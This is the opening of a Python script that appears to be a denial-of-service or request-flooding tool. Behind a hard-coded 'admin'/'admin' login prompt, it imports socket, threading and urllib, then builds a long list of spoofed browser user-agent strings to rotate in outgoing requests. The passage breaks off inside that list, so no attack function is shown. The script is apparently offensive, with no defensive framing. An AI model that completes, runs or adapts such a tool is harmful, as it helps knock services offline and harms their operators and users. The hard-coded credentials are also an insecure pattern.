correct_id = "admin"
correct_password = "admin"


while True:
    input_id = input("\033[1;34;40m Enter your ID: ")
    input_password = input("\033[1;34;40m Enter your password: ")

    if input_id == correct_id and input_password == correct_password:
        print("\033[92m Login successful!")

        from colorama import Fore, Back, Style
        from queue import Queue
        from optparse import OptionParser
        import time, sys, socket, threading, logging, urllib.request, random


        def user_agent():
            global uagent
            uagent = []
            uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
            uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
            uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 FirePHP/0.3")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; es-AR; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; es-ES; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; ja; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729) FirePHP/0.3")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 FirePHP/0.3")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; rv:1.9.1.1) Gecko/20090716 Linux Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100524 Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Linux Mint/7 (Gloria) Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090714 SUSE/3.5.1-1.1 Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (X11; U; Linux x86; rv:1.9.1.1) Gecko/20090716 Linux Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (X11; U; Linux i686; nl-NL; rv:1.9.0.19) Gecko/20090720 Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2pre) Gecko/20090729 Ubuntu/9.04 (jaunty) Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5")
            uagent.append("Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.1) Gecko/20090722 Gentoo Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.1) Gecko/20090714 SUSE/3.5.1-1.1 Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; tr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 4.0.20506)")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 3.5.30729)")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 3.5.30729)")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; ca; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.2; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; tr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; hu; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; uk; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; sr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729) FirePHP/0.3")
            uagent.append(
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1")
            uagent.append(
                "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5")
            uagent.append(
                "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/536.5 (KHTML like Gecko) Chrome/19.0.1084.56 Safari/1EA69")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/19.0.1047.0 Safari/535.22")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1042.0 Safari/535.21")
            uagent.append(
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1041.0 Safari/535.21")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0")
            uagent.append(
                "Mozilla/5.0 (Macintosh; AMD Mac OS X 10_8_2) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/18.6.872")
            uagent.append(
                "Mozilla/5.0 (X11; CrOS i686 1660.57.0) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.46 Safari/535.19")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Ubuntu/11.10 Chromium/18.0.1025.142 Chrome/18.0.1025.142 Safari/535.19")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.11 Safari/535.19")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/10.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.56 Chrome/17.0.963.56 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/17.0.940.0 Safari/535.8")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7ad-imcjapan-syosyaman-xkgi3lqg03!wgz")
            uagent.append(
                "Mozilla/5.0 (X11; CrOS i686 1193.158.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7xs5D9rRDFpg2g")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.8")
            uagent.append(
                "Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
            uagent.append(
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2")
            uagent.append(
                "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2")
            uagent.append(
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2")
            uagent.append(
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.04 Chromium/15.0.871.0 Chrome/15.0.871.0 Safari/535.2")
            uagent.append(
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2")
            uagent.append(
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.860.0 Safari/535.2")
            uagent.append(
                "Chrome/15.0.860.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/15.0.860.0")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.363.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (X11; U; x86_64 Linux; en_GB, en_US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.357.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.356.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.355.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.5 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.2 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux i586; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.1")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.16")
            uagent.append(
                "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9")
            uagent.append(
                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.308.0 Safari/532.9")
            uagent.append(
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36")
            uagent.append(
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
            uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
            uagent.append(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9")
            uagent.append(
                "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4")
            uagent.append(
